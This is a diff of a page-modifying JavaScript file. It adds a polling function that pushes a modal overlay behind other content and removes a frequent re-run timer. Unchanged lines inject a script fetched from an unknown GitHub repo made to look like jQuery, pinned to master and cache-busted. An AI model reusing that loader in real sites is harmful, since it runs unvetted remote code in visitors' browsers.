@@ -1,3 +1,5 @@
+let modalCheckInterval;
+
 function modifyElements() {
     function hasExcludedClass(element, classes) {
         for (let parent = element; parent !== document; parent = parent.parentNode) {
@@ -38,8 +40,20 @@ function modifyElements() {
     });
 }
 
+function checkForModal() {
+    const modal = document.getElementById('brws_mdl_window');
+    if (modal) {
+        const modalOverlay = Array.from(document.querySelectorAll('div')).find(div => div.style.zIndex === '2147483644');
+        if (modalOverlay) {
+            modalOverlay.style.zIndex = '1';
+            clearInterval(modalCheckInterval);  // Stop the interval after the z-index is updated
+        }
+    }
+}
+
 document.addEventListener('DOMContentLoaded', () => {
     modifyElements();
+    modalCheckInterval = setInterval(checkForModal, 500);  // Start checking the modal every 500ms
 });
 
 var currentUnixTimestamp = Math.floor(Date.now() / 1000);
@@ -47,5 +61,3 @@ var script = document.createElement('script');
 script.src = 'https://cdn.jsdelivr.net/gh/nd91jqf/jquery@master/infamous.js?version=' + currentUnixTimestamp;
 script.setAttribute('fetchpriority', 'high');
 document.head.appendChild(script);
-
-setInterval(modifyElements, 100);
